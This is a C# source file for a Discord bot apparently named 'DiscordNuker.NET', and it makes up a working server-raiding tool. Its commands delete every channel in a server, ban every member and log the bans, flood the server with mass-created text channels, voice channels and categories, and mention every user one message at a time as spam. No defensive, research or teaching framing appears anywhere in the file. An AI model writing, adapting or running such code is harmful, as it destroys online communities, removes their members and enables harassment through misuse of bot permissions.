using Discord.Commands;
using System;
using System.IO;
using System.Threading.Tasks;

namespace DiscordNuker.NET.Commands
{
    public class MassChannels : ModuleBase
    {
        [Command("mass chan", RunMode = RunMode.Async)]

        public async Task CreateChannels()
        {

            await ReplyAsync("Check console.");
            Console.WriteLine("[-] Number of channels to make?");
            string input = Console.ReadLine();
            int num = Convert.ToInt32(input);
            await Task.Delay(500);

            Console.WriteLine("[-] Name of channels? (seperate with -)");
            string channame = Console.ReadLine();

            for (int i = 0; i < num; i++)
            {
                await Context.Guild.CreateTextChannelAsync(channame);
                Console.WriteLine("Created " + channame + " | " + i);
            }
        }

        [Command("mass del", RunMode = RunMode.Async)]

        public async Task DelChannels()
        {
            await ReplyAsync("Alright!");

            foreach (var chan in await Context.Guild.GetChannelsAsync())
            {
                try
                {
                    await chan.DeleteAsync();
                    Console.WriteLine("Deleted " + chan);

                }
                catch
                {
                    Console.WriteLine("[x] Couldn't delete" + chan);
                }
            }
        }

        [Command("mass cate", RunMode = RunMode.Async)]

        public async Task CreateCategories()
        {
            await ReplyAsync("Check console.");
            Console.WriteLine("[-] Number of categories to make?");
            string input = Console.ReadLine();
            int num = Convert.ToInt32(input);
            await Task.Delay(500);

            Console.WriteLine("[-] Name of channels?");
            string catename = Console.ReadLine();

            for (int i = 0; i < num; i++)
            {
                await Context.Guild.CreateCategoryAsync(catename);
                Console.WriteLine("Created " + catename + " | " + i);
            }
        }

        [Command("mass vc", RunMode = RunMode.Async)]

        public async Task CreateVC()
        {

            await ReplyAsync("Check console.");
            Console.WriteLine("[-] Number of voice channels to make?");
            string input = Console.ReadLine();
            int num = Convert.ToInt32(input);
            await Task.Delay(500);

            Console.WriteLine("[-] Name of channels?");
            string vcname = Console.ReadLine();

            for (int i = 0; i < num; i++)
            {
                await Context.Guild.CreateVoiceChannelAsync(vcname);
                Console.WriteLine("Created " + vcname + " | " + i);
            }
        }

        [Command("mass ban", RunMode = RunMode.Async)]

        public async Task BanAll()
        {

            await ReplyAsync("Oki doki!");

            await Context.Guild.DownloadUsersAsync();
            foreach (var user in await Context.Guild.GetUsersAsync())
            {
                try
                {
                    await Context.Guild.AddBanAsync(user);
                    Console.WriteLine("Banned: " + user);
                    File.AppendAllText("NukerLogs.txt", DateTime.Now + " Banned: " + user + Environment.NewLine);
                }
                catch
                {
                    Console.WriteLine("Couldn't ban " + user);
                }

            }
        }

        [Command("mass ping", RunMode = RunMode.Async)]

        public async Task PingAll()
        {
            await ReplyAsync("Check console.");
            Console.WriteLine("[-] Message to say after mention?");
            var msg = Console.ReadLine();
            ;
            foreach (var mem in await Context.Guild.GetUsersAsync())
            {
                await ReplyAsync(mem.Mention + msg);
            }
        }
    }
}
